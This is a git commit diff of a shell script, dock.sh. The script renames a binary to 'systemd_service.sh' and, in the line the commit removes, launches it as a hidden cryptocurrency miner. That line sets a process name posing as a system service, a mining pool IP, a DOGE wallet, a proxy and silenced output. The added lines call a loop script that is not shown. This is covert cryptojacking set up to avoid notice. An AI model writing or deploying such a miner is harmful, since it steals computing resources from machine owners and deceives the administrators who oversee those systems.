50cb86a8f4d6c9e3990528383e0dae3f91eae26e
dediminari <101470275+dediminari@users.noreply.github.com>
2024-09-28 18:04:14 +0700

    Update dock.sh

--- dock.sh
+++ dock.sh
@@ -1,3 +1,4 @@
 chmod +x ./localruntime
 mv ./localruntime ./systemd_service.sh
-tmux new -d -s sys-session "exec -a systemd_service ./systemd_service.sh --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=DOCKOTO --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 &> /dev/null"
+chmod +x run_tmux_loop.sh
+./run_tmux_loop.sh
